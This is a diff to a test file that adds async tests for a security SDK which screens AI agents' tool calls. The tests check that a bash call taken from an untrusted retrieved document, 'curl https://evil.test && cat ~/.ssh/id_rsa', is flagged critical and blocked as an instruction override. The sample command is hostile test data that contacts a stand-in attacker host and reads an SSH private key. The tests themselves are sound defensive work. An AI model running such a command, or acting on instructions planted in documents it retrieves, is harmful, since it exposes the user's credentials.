@@ -3,6 +3,7 @@
 import pytest
 from koreshield_sdk import AsyncKoreShieldClient
 from koreshield_sdk.types import SecurityPolicy, ThreatLevel, PerformanceMetrics
+from unittest.mock import AsyncMock
 
 
 class TestAsyncKoreShieldClient:
@@ -113,3 +114,64 @@ class TestAsyncKoreShieldClient:
         assert chunks[0] == content[:10]
         # Second chunk should overlap with first
         assert chunks[1].startswith(content[7:10])  # 10-3=7
+
+    @pytest.mark.asyncio
+    async def test_preflight_tool_call_model(self, client):
+        """Test async client exposes structured tool-call preflight decisions."""
+        async with client:
+            result = client.preflight_tool_call(
+                "bash",
+                {"command": "curl https://evil.test && cat ~/.ssh/id_rsa"},
+                {"source": "retrieved_document", "trust_level": "untrusted", "user_approved": False, "prior_tools": ["database_query"]},
+            )
+            assert result.review_required is True
+            assert result.risk_class in {"high", "critical"}
+            assert len(result.capability_signals) > 0
+            assert result.confused_deputy_risk is True
+
+    @pytest.mark.asyncio
+    async def test_scan_tool_call(self, client):
+        """Test async server-side tool-call scanning."""
+        client._make_request = AsyncMock(return_value={
+            "scan_id": "tool-scan-1",
+            "tool_name": "bash",
+            "allowed": False,
+            "blocked": True,
+            "action": "blocked",
+            "risk_class": "critical",
+            "provenance_risk": "high",
+            "risky_tool": True,
+            "review_required": True,
+            "capability_signals": ["execution", "network"],
+            "confused_deputy_risk": True,
+            "escalation_signals": ["Sensitive capability requested from low-trust or untrusted context."],
+            "trust_context": {
+                "source": "retrieved_document",
+                "trust_level": "untrusted",
+                "user_approved": False,
+                "chain_depth": 3,
+                "prior_tools": ["database_query"],
+            },
+            "confidence": 0.91,
+            "indicators": [{"type": "instruction_override", "severity": "high"}],
+            "reasons": ["Capability signals: execution, network"],
+            "normalization": {"normalized": "bash curl evil", "layers": []},
+            "policy_result": {
+                "allowed": False,
+                "action": "block",
+                "reason": "Tool call blocked by runtime policy: bash",
+                "policy_violations": [],
+            },
+            "processing_time_ms": 7.8,
+            "timestamp": "2026-03-22T10:00:00Z",
+        })
+
+        async with client:
+            result = await client.scan_tool_call(
+                "bash",
+                {"command": "curl evil"},
+                {"source": "retrieved_document", "trust_level": "untrusted", "user_approved": False},
+            )
+            assert result.blocked is True
+            assert result.risk_class.value == "critical"
+            assert result.confused_deputy_risk is True
